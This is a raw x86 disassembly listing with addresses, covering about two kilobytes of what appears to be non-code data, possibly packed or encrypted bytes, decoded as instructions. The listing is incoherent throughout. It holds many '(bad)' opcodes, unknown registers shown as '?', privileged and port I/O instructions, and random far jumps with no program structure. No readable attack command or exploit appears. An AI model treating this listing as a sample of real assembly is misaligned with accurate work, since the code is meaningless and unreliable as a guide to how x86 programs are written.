  4175bd:	test   eax,0x5d6ce862
  4175c2:	mov    ds:0x95d78e63,al
  4175c7:	mov    ebp,0x94e87b86
  4175cc:	xor    eax,0x4fd124fc
  4175d1:	and    DWORD PTR [ebx-0x3a],ebp
  4175d4:	mov    fs,WORD PTR ds:0x7b508d95
  4175da:	pop    esp
  4175db:	mov    dl,0x53
  4175dd:	jmp    0x113:0x4dfd03ea
  4175e4:	into   
  4175e5:	bound  ebx,QWORD PTR [edx]
  4175e7:	pop    ebx
  4175e8:	sbb    ch,BYTE PTR [ebx+0x76b1c18b]
  4175ee:	nop
  4175ef:	sbb    esi,edi
  4175f1:	loope  0x4175c1
  4175f3:	(bad)  
  4175f4:	cmp    dh,BYTE PTR [eax-0x1e]
  4175f7:	cmp    BYTE PTR [esp+ecx*1],al
  4175fa:	sub    dl,BYTE PTR [edi-0x35]
  4175fd:	mov    al,ds:0xb7f3ed1d
  417602:	imul   ebp,DWORD PTR [edx*1+0x11a8e371],0x5e
  41760a:	sbb    al,0xe5
  41760c:	out    dx,al
  41760d:	repz xchg ebp,eax
  41760f:	lea    eax,[edx]
  417611:	popf   
  417612:	das    
  417613:	sub    al,0xc3
  417615:	aad    0xfd
  417617:	test   BYTE PTR ds:0xb07883d1,dl
  41761d:	pop    esi
  41761e:	pop    ebx
  41761f:	inc    esp
  417620:	inc    esi
  417621:	xor    ecx,DWORD PTR [esi]
  417623:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417624:	adc    al,0xb9
  417626:	mov    ds:0x26b1fc06,al
  41762b:	xchg   ebp,eax
  41762c:	mov    bh,0xf
  41762e:	popa   
  41762f:	loopne 0x41766b
  417631:	data16 jg 0x41766f
  417634:	test   eax,0xfb6cd6f9
  417639:	rol    DWORD PTR [eax-0x27],0x56
  41763d:	jp     0x41767f
  41763f:	dec    ecx
  417640:	cwde   
  417641:	mov    esi,gs
  417643:	pop    eax
  417644:	popf   
  417645:	dec    ebx
  417646:	in     al,0x66
  417648:	or     eax,0x39259bfa
  41764d:	mov    ebx,0xaca13d9e
  417652:	(bad)  
  417653:	retf   
  417654:	pop    eax
  417655:	mov    eax,ds:0x4b3da25e
  41765a:	mov    al,ds:0x57e4b122
  41765f:	and    al,0xf9
  417661:	sar    eax,cl
  417663:	enter  0xc617,0xe3
  417667:	and    al,0xe1
  417669:	mov    BYTE PTR [ebx+0x33514f4a],bh
  41766f:	push   0xffffffb2
  417671:	xor    DWORD PTR [ecx+esi*8-0x1f],0x5db83011
  417679:	div    DWORD PTR [eax+ebx*8]
  41767c:	int    0x51
  41767e:	mov    ebp,0x41129f72
  417683:	push   es
  417684:	idiv   DWORD PTR [edx-0x37]
  417687:	cmp    edx,esp
  417689:	fist   DWORD PTR [eax-0x1e1a3799]
  41768f:	or     al,0x54
  417691:	fcomp  st(0)
  417693:	arpl   WORD PTR [eax-0x47],dx
  417696:	popa   
  417697:	sbb    edx,DWORD PTR [edx]
  417699:	clc    
  41769a:	bound  edx,QWORD PTR [ecx+0x352285e5]
  4176a0:	icebp  
  4176a1:	dec    edi
  4176a2:	push   ebx
  4176a3:	sub    al,0xff
  4176a5:	xchg   ebx,eax
  4176a6:	xchg   ecx,eax
  4176a7:	pop    ebp
  4176a8:	mov    bh,0x10
  4176aa:	dec    edx
  4176ab:	jg     0x4176a7
  4176ad:	ja     0x4176ff
  4176af:	sbb    bh,al
  4176b1:	cmp    dl,ah
  4176b3:	inc    esi
  4176b4:	jnp    0x4176d2
  4176b6:	sub    eax,0x16d833c1
  4176bb:	jbe    0x4176bd
  4176bd:	out    dx,al
  4176be:	and    bl,BYTE PTR [ebx+0x9]
  4176c1:	and    BYTE PTR [eax],al
  4176c3:	mov    WORD PTR [esi+0x53],cs
  4176c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176c7:	jno    0x4176b2
  4176c9:	mov    WORD PTR [edx-0x5e013505],fs
  4176cf:	cmp    cl,dh
  4176d1:	das    
  4176d2:	pop    ecx
  4176d3:	in     eax,0x9f
  4176d5:	mov    ecx,0xf1ac2fa6
  4176da:	dec    ecx
  4176db:	mov    al,ds:0x7abb20af
  4176e0:	sbb    BYTE PTR [ecx-0x78704917],cl
  4176e6:	daa    
  4176e7:	dec    edi
  4176e8:	clc    
  4176e9:	pop    edx
  4176ea:	mov    ?,edi
  4176ec:	xor    dh,BYTE PTR [ebp+0x3d3ec147]
  4176f2:	les    ebx,FWORD PTR [eax]
  4176f4:	icebp  
  4176f5:	mov    ebp,0xa6ae85c4
  4176fa:	test   al,0x64
  4176fc:	mov    bh,0x29
  4176fe:	test   al,0xe2
  417700:	or     eax,0xd473bc51
  417705:	push   ss
  417706:	into   
  417707:	into   
  417708:	adc    BYTE PTR [ecx-0x37bf90df],0xf2
  41770f:	push   edi
  417710:	inc    esi
  417711:	add    eax,eax
  417713:	retf   0xf183
  417716:	js     0x41778b
  417718:	mov    ds:0xf36b905a,eax
  41771d:	pop    edx
  41771e:	in     eax,0x74
  417720:	cwde   
  417721:	clc    
  417722:	mov    al,ds:0x9ded712d
  417727:	sar    BYTE PTR [edx+0x70],cl
  41772a:	mov    ds:0x8f3affed,eax
  41772f:	add    ch,BYTE PTR [ebx]
  417731:	mov    ecx,0x4fc19a86
  417736:	xor    al,0xa4
  417738:	ret    0x17c7
  41773b:	fcom   st(3)
  41773d:	mov    al,0xbd
  41773f:	into   
  417740:	adc    DWORD PTR [esi+0x5fe8b311],edi
  417746:	ret    
  417747:	imul   esi,DWORD PTR [ebx],0x21
  41774a:	das    
  41774b:	mov    esi,0x14da0817
  417750:	lahf   
  417751:	mov    ebx,0xc0e31834
  417756:	rcr    DWORD PTR [ebx+0x47],0xaf
  41775a:	cmp    al,0x30
  41775c:	inc    ebp
  41775d:	pop    eax
  41775e:	jp     0x417701
  417760:	mov    bl,0xa9
  417762:	lahf   
  417763:	fiadd  DWORD PTR [edi+edi*4+0x774e5ff6]
  41776a:	xor    BYTE PTR ds:0x96b61a8d,bl
  417770:	fnstcw WORD PTR [esi]
  417772:	pusha  
  417773:	imul   esp,DWORD PTR [edx+0x11],0x33dd1805
  41777a:	mov    ds:0x64c803be,eax
  41777f:	inc    ebp
  417780:	xchg   edi,eax
  417781:	push   ebx
  417782:	jae    0x4177b3
  417784:	pop    esi
  417785:	add    DWORD PTR [ecx-0x5b],0xffffffab
  417789:	and    al,0xde
  41778b:	jae    0x4177ed
  41778d:	addr16 in al,0xa5
  417790:	adc    BYTE PTR [ecx-0x3f],0x26
  417794:	dec    ebp
  417795:	add    DWORD PTR [esi+0x43af9d53],0x2b
  41779c:	adc    ebx,0xfffffff5
  41779f:	sbb    esi,DWORD PTR [ebp-0x78]
  4177a2:	nop
  4177a3:	cmp    DWORD PTR [ebp-0x11425812],ebp
  4177a9:	adc    BYTE PTR [edi+eax*8+0x5],0xff
  4177ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177af:	iret   
  4177b0:	or     BYTE PTR [edi+0xf6697e6],ah
  4177b6:	or     eax,0xb28dfeef
  4177bb:	push   esp
  4177bc:	pop    esp
  4177bd:	scas   al,BYTE PTR es:[edi]
  4177be:	(bad)  
  4177c0:	clc    
  4177c1:	xor    edx,ebx
  4177c3:	push   0x951f102c
  4177c8:	dec    esp
  4177c9:	mov    ch,0xae
  4177cb:	stos   DWORD PTR es:[edi],eax
  4177cc:	adc    eax,0x49165078
  4177d1:	test   al,0xed
  4177d3:	ret    
  4177d4:	lods   al,BYTE PTR ds:[esi]
  4177d5:	lahf   
  4177d6:	lock lahf 
  4177d8:	inc    edi
  4177d9:	lea    edi,[edx-0x46]
  4177dc:	or     eax,0xabf0b359
  4177e1:	enter  0xacd9,0x1c
  4177e5:	mov    ds:0x8ede6057,al
  4177ea:	aad    0xad
  4177ec:	jb     0x41782d
  4177ee:	lock sub eax,0x55b98d8e
  4177f4:	pop    ss
  4177f5:	test   dh,bh
  4177f7:	pop    es
  4177f8:	xchg   esp,eax
  4177f9:	mov    bl,0x12
  4177fb:	push   ss
  4177fc:	pop    edi
  4177fd:	into   
  4177fe:	dec    BYTE PTR [edx]
  417800:	ins    DWORD PTR es:[edi],dx
  417801:	(bad)  
  417802:	pop    ecx
  417803:	mov    edx,0x535ffeab
  417808:	(bad)  
  417809:	and    DWORD PTR [esi+esi*4],esp
  41780c:	push   ecx
  41780d:	lea    ebx,[edx]
  41780f:	mov    esp,ss
  417811:	loop   0x417795
  417813:	dec    edi
  417814:	xchg   esp,eax
  417815:	push   ebx
  417816:	inc    eax
  417817:	pop    edx
  417818:	fadd   DWORD PTR [ecx+0x6d]
  41781b:	cmp    al,0xaf
  41781d:	into   
  41781e:	or     eax,DWORD PTR [eax]
  417820:	adc    BYTE PTR [esi+0x249a382e],ah
  417826:	out    0xf5,al
  417828:	mov    ebx,0x7e0f3881
  41782d:	leave  
  41782e:	xchg   esp,eax
  41782f:	ds cmp al,ah
  417832:	mov    al,ds:0xd7fb4c1c
  417837:	fimul  DWORD PTR [edx+0x205c61be]
  41783d:	mov    eax,0xfa0e83f3
  417842:	jecxz  0x4178a6
  417844:	popf   
  417845:	mov    esi,0x7efd895b
  41784a:	add    eax,0xffffffef
  41784d:	gs inc eax
  41784f:	(bad)  
  417850:	fistp  DWORD PTR [edi-0x1b4c63d4]
  417856:	rcl    DWORD PTR [ecx+0x28],cl
  417859:	jp     0x417871
  41785b:	mov    esi,0x9e8408d2
  417860:	dec    ebp
  417861:	xor    BYTE PTR [esi],ch
  417863:	stc    
  417864:	inc    edx
  417865:	or     eax,0xf673b264
  41786a:	push   es
  41786b:	sub    DWORD PTR [ebp+0x4c],eax
  41786e:	jnp    0x417813
  417870:	push   esp
  417871:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417872:	push   ss
  417873:	cmp    ah,al
  417875:	xchg   edx,eax
  417876:	and    ch,bh
  417878:	adc    dh,BYTE PTR es:[ebx]
  41787b:	mov    esp,0x62013fdf
  417880:	dec    esp
  417881:	jne    0x417828
  417883:	fxch   st(5)
  417885:	mov    ?,ebx
  417887:	sbb    DWORD PTR [ebx+0x3d],esp
  41788a:	jp     0x417822
  41788c:	lods   eax,DWORD PTR ds:[si]
  41788e:	imul   esp,ecx,0xffffffa9
  417891:	les    eax,FWORD PTR [eax+0x7714e5b1]
  417897:	xlat   BYTE PTR ds:[ebx]
  417898:	sub    BYTE PTR [edi-0x7d3ddde1],al
  41789e:	fistp  WORD PTR [esi-0x4d8bfbaa]
  4178a4:	cmp    ecx,DWORD PTR [esi+0x7421b560]
  4178aa:	mov    al,0xbb
  4178ac:	sub    eax,0xea20f8c6
  4178b1:	push   edx
  4178b2:	hlt    
  4178b3:	aas    
  4178b4:	lahf   
  4178b5:	jg     0x417840
  4178b7:	push   0x34
  4178b9:	dec    ebx
  4178ba:	xor    DWORD PTR [edi],eax
  4178bc:	stos   BYTE PTR es:[edi],al
  4178bd:	xchg   ebp,eax
  4178be:	js     0x417852
  4178c0:	daa    
  4178c1:	mov    dl,0xa1
  4178c3:	in     eax,0x1
  4178c5:	mov    BYTE PTR [eax],ch
  4178c7:	mov    BYTE PTR [ebp+0x52],bl
  4178ca:	xchg   edx,eax
  4178cb:	(bad)  
  4178cc:	data16 fbld TBYTE PTR ds:0x2e15dceb
  4178d3:	mov    ecx,0x3fe3f55c
  4178d8:	pop    ebp
  4178d9:	sti    
  4178da:	mov    BYTE PTR [esp+edi*2],bl
  4178dd:	sbb    BYTE PTR [edx],0x91
  4178e0:	test   ecx,eax
  4178e2:	xchg   edx,eax
  4178e3:	xor    dh,dh
  4178e5:	aaa    
  4178e6:	mov    eax,0x164c1684
  4178eb:	xchg   BYTE PTR [esi-0x42],al
  4178ee:	fcom   DWORD PTR [ecx+0x53c60495]
  4178f4:	lods   eax,DWORD PTR ds:[esi]
  4178f5:	mov    esi,0x9ac46a17
  4178fa:	dec    eax
  4178fb:	mov    al,ds:0x1c6a8ed9
  417901:	nop
  417902:	les    edi,FWORD PTR [eax]
  417904:	outs   dx,BYTE PTR ds:[esi]
  417905:	loopne 0x4178ac
  417907:	dec    eax
  417908:	xor    cl,cl
  41790a:	out    dx,eax
  41790b:	es cmc 
  41790d:	or     bl,0xc5
  417910:	mov    edx,0xdbb3ffee
  417915:	cmp    edi,DWORD PTR [eax-0x4a]
  417918:	fwait
  417919:	stc    
  41791a:	retf   
  41791b:	aas    
  41791c:	add    al,0x70
  41791e:	sbb    eax,0xb362b0bb
  417923:	es hlt 
  417925:	cdq    
  417926:	std    
  417927:	retf   
  417928:	pop    edi
  417929:	dec    edx
  41792a:	cwde   
  41792b:	push   esp
  41792c:	stc    
  41792d:	mov    ch,0x9b
  41792f:	mov    ds:0xeb5164dc,al
  417934:	sti    
  417935:	lds    ecx,FWORD PTR [ebp-0x35]
  417938:	dec    ebx
  417939:	cmp    eax,0xd57915a
  41793e:	jbe    0x4178e4
  417940:	psubusb mm3,QWORD PTR [esi+0x5922750a]
  417947:	jmp    0xbcdd85fd
  41794c:	mov    ecx,DWORD PTR [esp+esi*4-0x2b]
  417950:	stos   BYTE PTR es:[edi],al
  417951:	fstp   QWORD PTR [edi]
  417953:	jl     0xb45b211c
  417959:	add    dh,BYTE PTR [ecx+0x50]
  41795c:	push   es
  41795d:	jae    0x41796b
  41795f:	nop
  417960:	mov    dl,0x11
  417962:	pop    ebx
  417963:	pusha  
  417964:	addr16 aad 0x89
  417967:	les    esi,FWORD PTR [esi-0x3592f1e6]
  41796d:	sbb    DWORD PTR [edi],esi
  41796f:	cld    
  417970:	lods   eax,DWORD PTR ds:[esi]
  417971:	sbb    eax,DWORD PTR [ecx]
  417973:	pop    edi
  417974:	ret    0xf79a
  417977:	xchg   ebp,eax
  417978:	pop    ds
  417979:	mov    bh,0xfa
  41797b:	lea    ebx,[eax+0x1c80669e]
  417981:	loop   0x4179ef
  417983:	int    0xbb
  417985:	jg     0x4179cf
  417987:	xchg   ecx,eax
  417988:	or     al,0x33
  41798a:	das    
  41798b:	sahf   
  41798c:	in     al,0xd5
  41798e:	jnp    0x417995
  417990:	sub    ebp,esp
  417992:	add    dh,al
  417994:	pop    edi
  417995:	clc    
  417996:	cdq    
  417997:	ds dec edx
  417999:	push   eax
  41799a:	(bad)  
  41799b:	shr    DWORD PTR [edx+esi*2],1
  41799e:	sub    bl,bl
  4179a0:	arpl   WORD PTR [esi+0x6762b9ee],dx
  4179a6:	push   es
  4179a7:	jmp    0x4b3a:0xe1f70624
  4179ae:	mov    bh,0xd1
  4179b0:	mov    WORD PTR [ebx-0x1e],ds
  4179b3:	and    bh,BYTE PTR [edi+0x486b9bb7]
  4179b9:	aaa    
  4179ba:	jb     0x4179e8
  4179bc:	jo     0x4179b4
  4179be:	rol    bl,cl
  4179c0:	mov    ?,WORD PTR [ecx-0x10]
  4179c3:	test   al,0xcf
  4179c5:	cmp    BYTE PTR [edi],0x7b
  4179c8:	pop    ebx
  4179c9:	jbe    0x417977
  4179cb:	sti    
  4179cc:	mov    esi,0x608f6f16
  4179d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179d2:	div    DWORD PTR [eax+0x1d]
  4179d5:	and    eax,DWORD PTR [ebx]
  4179d7:	sbb    eax,0x3e50be00
  4179dc:	add    eax,0xc51354e0
  4179e1:	(bad)  
  4179e2:	imul   ecx,DWORD PTR [edi-0x6dd65f8f],0x883a74ee
  4179ec:	mov    ecx,0x952b47fb
  4179f1:	dec    edi
  4179f2:	jo     0x4179f1
  4179f4:	mov    WORD PTR [edi-0x3414ebff],ss
  4179fa:	pop    ss
  4179fb:	cmp    eax,0x9b308c75
  417a00:	fbstp  TBYTE PTR [ebx-0x63]
  417a03:	xor    al,0x7c
  417a05:	in     eax,dx
  417a06:	or     eax,0x5ce0be7c
  417a0b:	push   ebx
  417a0c:	sbb    eax,0x6e5c79e8
  417a11:	fs call 0x3ef7:0x8792d77b
  417a19:	pop    ebp
  417a1a:	xchg   ebx,eax
  417a1b:	mov    cs,edi
  417a1d:	imul   DWORD PTR [edi+0x1823511]
  417a23:	add    dh,BYTE PTR [edx]
  417a25:	xor    al,0x8d
  417a27:	xchg   DWORD PTR [ecx],ebp
  417a29:	(bad)  
  417a2a:	push   ss
  417a2b:	test   dl,dh
  417a2d:	jge    0x417a32
  417a2f:	lahf   
  417a30:	mov    ch,BYTE PTR [edi]
  417a32:	jmp    0x4179d2
  417a34:	scas   eax,DWORD PTR es:[edi]
  417a35:	(bad)  
  417a36:	popa   
  417a37:	test   eax,0x840e46d5
  417a3c:	hlt    
  417a3d:	ds ins BYTE PTR es:[edi],dx
  417a3f:	jo     0x4179dd
  417a41:	das    
  417a42:	mov    cl,0x38
  417a44:	test   eax,0xe98ffee1
  417a49:	dec    esi
  417a4a:	sub    DWORD PTR [ecx+0x158771e6],edx
  417a50:	inc    eax
  417a51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a52:	dec    ecx
  417a53:	js     0x417a80
  417a55:	mov    ds:0x57805f91,al
  417a5a:	hlt    
  417a5b:	jmp    0x417a9e
  417a5d:	call   0xe30c:0xf382c931
  417a64:	pop    ecx
  417a65:	adc    ebp,esi
  417a67:	in     eax,0x4e
  417a69:	add    DWORD PTR [eax+0x5600e745],edx
  417a6f:	pop    eax
  417a70:	pop    ebp
  417a71:	xchg   esp,ebp
  417a73:	(bad)  
  417a74:	enter  0x2cb7,0xef
  417a78:	rcl    DWORD PTR [edx],cl
  417a7a:	or     eax,ebx
  417a7c:	jnp    0x417a93
  417a7e:	push   eax
  417a7f:	or     eax,0xc3ba4ae9
  417a84:	or     ebx,DWORD PTR [edx-0x78]
  417a87:	add    eax,0x31453861
  417a8c:	addr16 adc eax,0xab42c197
  417a92:	pop    edx
  417a93:	stos   BYTE PTR es:[edi],al
  417a94:	lods   al,BYTE PTR ds:[esi]
  417a95:	xor    BYTE PTR [ebp+0x2c66ace7],ah
  417a9b:	add    dl,BYTE PTR [edi+0x52a21cff]
  417aa1:	mov    dl,0xc7
  417aa3:	pop    esi
  417aa4:	mov    ah,0xe8
  417aa6:	(bad)  
  417aa7:	xor    eax,0xb58a12bc
  417aac:	xchg   ebx,eax
  417aad:	pop    edx
  417aae:	ins    BYTE PTR es:[edi],dx
  417aaf:	or     BYTE PTR [esp+edi*8],al
  417ab2:	mov    WORD PTR [ebx+0x60e54b12],es
  417ab8:	in     eax,0x6f
  417aba:	mov    al,0x15
  417abc:	popf   
  417abd:	sub    BYTE PTR [edx-0x1f],dl
  417ac0:	sbb    al,0x67
  417ac2:	data16 jbe 0x417acc
  417ac5:	adc    ebx,edi
  417ac7:	or     eax,0x26826b9b
  417acc:	cmp    eax,0x6275d247
  417ad1:	jo     0x417aa4
  417ad3:	outs   dx,BYTE PTR ds:[esi]
  417ad4:	or     al,0x1e
  417ad7:	xor    dh,BYTE PTR [edx+eax*2-0x56]
  417adb:	xchg   ebp,eax
  417adc:	int3   
  417add:	push   ecx
  417ade:	dec    ebx
  417adf:	mov    esi,0x8a40432d
  417ae4:	leave  
  417ae5:	xchg   esp,eax
  417ae6:	leave  
  417ae7:	fs mov dl,0xfe
  417aea:	ficomp WORD PTR [edi+0x1a]
  417aed:	or     eax,0xaf916b8b
  417af2:	enter  0xa2a0,0x3c
  417af6:	sub    DWORD PTR [eax-0x55],esi
  417af9:	neg    DWORD PTR [ebx]
  417afb:	fsubr  QWORD PTR [ecx]
  417afd:	rol    BYTE PTR [edi+ebp*1],1
  417b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b01:	call   0x326a:0x77f499a2
  417b08:	dec    ecx
  417b09:	add    esp,DWORD PTR es:[esi+eax*1]
  417b0d:	rcl    BYTE PTR [ecx+ecx*4],cl
  417b10:	in     eax,dx
  417b11:	(bad)  
  417b12:	dec    bh
  417b14:	sub    DWORD PTR [eax],0xf1290d0e
  417b1a:	mov    ch,0xc0
  417b1c:	dec    edx
  417b1d:	mov    BYTE PTR ds:0x6f539c05,ah
  417b23:	mov    cl,0x26
  417b25:	xchg   ebx,eax
  417b26:	test   DWORD PTR [edi+0x19],eax
  417b29:	imul   eax,DWORD PTR [ecx+0x60379bae],0x8bbacaaf
  417b33:	ss push edi
  417b35:	sbb    dh,bl
  417b37:	xchg   DWORD PTR [bx],edx
  417b3a:	adc    ecx,edx
  417b3c:	sbb    esp,DWORD PTR [eax-0x78]
  417b3f:	mov    eax,ds:0x6617dd75
  417b44:	pop    ds
  417b45:	repz pop edi
  417b47:	ret    0xc5a3
  417b4a:	out    dx,al
  417b4b:	ss push ebx
  417b4d:	push   ebx
  417b4e:	(bad)  
  417b4f:	mov    ebx,0x8610c233
  417b54:	aad    0xe2
  417b56:	stos   BYTE PTR es:[edi],al
  417b57:	in     al,dx
  417b58:	stc    
  417b59:	scas   al,BYTE PTR es:[edi]
  417b5a:	xchg   esi,eax
  417b5b:	jne    0x417b90
  417b5d:	xor    cl,BYTE PTR [edx]
  417b5f:	xchg   edx,eax
  417b60:	je     0x417afd
  417b62:	jb     0x417b40
  417b64:	outs   dx,DWORD PTR ds:[esi]
  417b65:	call   0x3108:0x63a37c5a
  417b6c:	cmc    
  417b6d:	aad    0xac
  417b6f:	mov    dl,cl
  417b71:	mov    bl,0xf2
  417b73:	mov    bh,0x43
  417b75:	sbb    DWORD PTR [esi*8-0x132ddfb],edi
  417b7c:	call   0xb7e:0x13092257
  417b83:	out    0x69,eax
  417b85:	mov    WORD PTR [eax],es
  417b87:	je     0x417c08
  417b89:	in     eax,dx
  417b8a:	retf   
  417b8b:	cmp    DWORD PTR [eax],0xb486d691
  417b91:	push   ecx
  417b92:	mov    eax,ds:0xe824a8f7
  417b97:	jne    0x417bfa
  417b99:	pusha  
  417b9a:	je     0x417bd6
  417b9c:	fcmovne st,st(5)
  417b9e:	jb     0x417b3c
  417ba0:	add    al,0x73
  417ba2:	loopne 0x417b38
  417ba4:	ror    BYTE PTR [esi],cl
  417ba6:	aaa    
  417ba7:	or     ebp,0xffffffa7
  417baa:	shl    DWORD PTR [ebp+0x569bb299],cl
  417bb0:	aad    0x82
  417bb2:	les    ecx,FWORD PTR [esi-0x1c]
  417bb5:	out    0xb8,al
  417bb7:	shl    BYTE PTR [ebx-0x638d1388],cl
  417bbd:	or     ebp,DWORD PTR [eax-0x42]
  417bc0:	test   eax,0xf53a9c96
  417bc5:	mov    al,BYTE PTR [ecx+0x42]
  417bc8:	adc    BYTE PTR [ecx],dl
  417bca:	sti    
  417bcb:	pop    edx
  417bcc:	add    edi,DWORD PTR [edx]
  417bce:	add    edx,0x45ad6b2e
  417bd4:	jae    0x417c54
  417bd6:	outs   dx,BYTE PTR ds:[esi]
  417bd7:	cld    
  417bd8:	sbb    DWORD PTR [ecx-0x66],ecx
  417bdb:	mov    cl,0xf0
  417bdd:	rcr    BYTE PTR [esi],0x63
  417be0:	test   DWORD PTR [eax],0x1f98c770
  417be6:	cld    
  417be7:	pop    ebp
  417be8:	test   BYTE PTR [ebp-0x6817546],0xb2
  417bef:	mov    ds:0x9d373b37,eax
  417bf4:	add    eax,0x9aaf961e
  417bf9:	xlat   BYTE PTR ds:[ebx]
  417bfa:	xchg   edi,eax
  417bfb:	mov    dh,0xb8
  417bfd:	mov    DWORD PTR [edx+0x70b7a280],esp
  417c03:	xchg   DWORD PTR [eax],eax
  417c05:	sbb    ebp,ebx
  417c07:	ret    0x10f5
  417c0a:	js     0x417c82
  417c0c:	jle    0x417b96
  417c0e:	xor    al,0xbf
  417c10:	jae    0x417c0b
  417c12:	pop    ss
  417c13:	push   edi
  417c14:	mov    WORD PTR [eax+0x16e1de60],fs
  417c1a:	stos   BYTE PTR es:[edi],al
  417c1b:	rcr    BYTE PTR [eax+0x78273117],cl
  417c21:	dec    ecx
  417c22:	xor    eax,0x90316a58
  417c27:	xchg   ebx,eax
  417c28:	pop    es
  417c29:	outs   dx,DWORD PTR ds:[esi]
  417c2a:	or     ch,BYTE PTR [edi]
  417c2c:	aam    0x86
  417c2e:	scas   al,BYTE PTR es:[edi]
  417c2f:	jp     0x417bee
  417c31:	cmp    DWORD PTR [ecx-0x29],ebp
  417c34:	pushf  
  417c35:	or     ebx,DWORD PTR [ebx+0x9]
  417c38:	das    
  417c39:	xor    ch,BYTE PTR [ecx+0x5e]
  417c3c:	cmp    dh,BYTE PTR [ecx+eiz*8-0x756a8b8]
  417c43:	loope  0x417bcb
  417c45:	stos   DWORD PTR es:[edi],eax
  417c46:	aaa    
  417c47:	xchg   esi,eax
  417c48:	jbe    0x417be6
  417c4a:	in     al,0x88
  417c4c:	sub    DWORD PTR [eax+ebp*2],esi
  417c4f:	add    BYTE PTR [edi+0x78e1cef2],dl
  417c55:	jmp    0x1b58:0xb54dc770
  417c5c:	mov    ah,0x73
  417c5e:	push   esi
  417c5f:	(bad)  [ebx]
  417c61:	fst    QWORD PTR [ecx-0x4cbba320]
  417c67:	mov    esi,es
  417c69:	jmp    0xf9c2:0x7e363c91
  417c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c71:	xlat   BYTE PTR ds:[ebx]
  417c72:	sub    esp,DWORD PTR [esi]
  417c74:	add    DWORD PTR [ebx+edi*8+0x65],0x8bb20828
  417c7c:	mov    eax,ds:0xc8f63d7a
  417c81:	imul   edx,DWORD PTR [esi+0x23],0x4b
  417c85:	pushf  
  417c86:	mov    edi,0x6f09a7c6
  417c8b:	out    0xd2,al
  417c8d:	jmp    0x5cab:0x89e3417
  417c94:	and    esi,ecx
  417c96:	xor    bh,BYTE PTR [ecx]
  417c98:	ftst   
  417c9a:	push   ss
  417c9b:	aad    0x31
  417c9d:	ins    DWORD PTR es:[edi],dx
  417c9e:	xchg   DWORD PTR [esi+0x44],edi
  417ca1:	adc    BYTE PTR [edi-0x25],bh
  417ca4:	pushf  
  417ca5:	mov    BYTE PTR [edi],ch
  417ca7:	and    dl,0x58
  417caa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cab:	sub    edx,DWORD PTR [edi-0x60]
  417cae:	mov    eax,0xf2c33f90
  417cb3:	pop    ecx
  417cb4:	mov    ds:0xbcf5c640,al
  417cb9:	add    DWORD PTR [ebx-0x21],ebp
  417cbc:	jns    0x417cd5
  417cbe:	mov    WORD PTR ds:0xb41c8ce5,ss
  417cc4:	fisttp QWORD PTR [eax+esi*4]
  417cc7:	push   edx
  417cc8:	dec    ecx
  417cc9:	nop
  417cca:	lods   al,BYTE PTR ds:[esi]
  417ccb:	mov    ss,ebx
  417ccd:	mov    bh,0xa0
  417ccf:	ins    DWORD PTR es:[edi],dx
  417cd0:	shr    DWORD PTR [ecx-0x16],1
  417cd3:	pop    es
  417cd4:	sbb    al,0x95
  417cd6:	inc    edx
  417cd7:	xchg   esi,eax
  417cd8:	loop   0x417c9a
  417cda:	mov    BYTE PTR [ecx+eiz*2-0x2a],bl
  417cde:	pop    es
  417cdf:	push   esp
  417ce0:	(bad)  
  417ce1:	test   dh,0xf6
  417ce4:	mov    al,0x2
  417ce6:	les    edx,FWORD PTR [ecx-0x6a]
  417ce9:	push   esi
  417cea:	mov    ah,0x58
  417cec:	icebp  
  417ced:	loope  0x417cee
  417cef:	and    DWORD PTR [edi],ebp
  417cf1:	pop    edi
  417cf2:	and    DWORD PTR [eax-0x76],0xffffffe7
  417cf6:	adc    al,0xea
  417cf8:	data16 jns 0x417c9b
  417cfb:	jnp    0x417d2b
  417cfd:	xor    BYTE PTR [eax],dl
  417cff:	repz jno 0x417ce7
  417d02:	add    edi,edx
  417d04:	data16 jecxz 0x417d26
  417d07:	adc    BYTE PTR [edx+0x740f1ad8],dl
  417d0d:	cld    
  417d0e:	mov    dl,0x94
  417d10:	fsub   QWORD PTR [eax+0x7e]
  417d13:	mov    esi,0x5500c734
  417d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d19:	out    dx,eax
  417d1a:	call   0x2369185b
  417d1f:	mov    ds:0xd296e0a5,al
  417d24:	mov    ds:0xe5bec1f7,eax
  417d29:	sahf   
  417d2a:	and    BYTE PTR [eax-0x239836ba],ch
  417d30:	js     0x417d1e
  417d32:	xor    eax,0x63c562af
  417d37:	in     al,0x35
  417d39:	jecxz  0x417cdc
  417d3b:	adc    al,0xd
  417d3d:	sbb    BYTE PTR gs:[edi-0x2e],0x19
  417d42:	pop    ss
  417d43:	sub    BYTE PTR [eax+edi*4],ah
  417d46:	call   0x7e2b:0x6f643265
  417d4d:	add    ebx,DWORD PTR [ecx-0x5e]
  417d50:	pop    ebx
  417d51:	xor    BYTE PTR [edx+0x59698bdc],al
  417d57:	gs xchg edx,eax
  417d59:	lods   eax,DWORD PTR ds:[esi]
  417d5a:	dec    ebp
  417d5b:	adc    DWORD PTR [edx+0x2],esi
  417d5e:	xchg   BYTE PTR [edx+0xf],cl
  417d61:	(bad)
  417d64:	retf   
  417d65:	mov    eax,0x992a7f12
  417d6a:	iret   
  417d6b:	rol    BYTE PTR [eax],cl
  417d6d:	xor    DWORD PTR [edx+0x7],edi
  417d70:	and    al,0xbe
  417d72:	bound  ebp,QWORD PTR [ebp+0x6a]
  417d75:	call   0xf8a5b9c0
  417d7a:	xchg   edx,eax
  417d7b:	scas   eax,DWORD PTR es:[edi]
  417d7c:	cmp    al,0xb4
  417d7e:	mov    bh,0x12
  417d80:	add    eax,DWORD PTR [edi-0x4c0607eb]
  417d86:	popf   
  417d87:	fstp   DWORD PTR [ecx+0x0]
  417d8a:	sbb    BYTE PTR [ecx-0xe5c67c7],ah
  417d90:	inc    ecx
  417d91:	mov    eax,0x801646be
  417d96:	fbld   TBYTE PTR [eax-0x88944e5]
  417d9c:	hlt    
  417d9d:	in     eax,0x1d
  417d9f:	iret   
  417da0:	inc    ebx
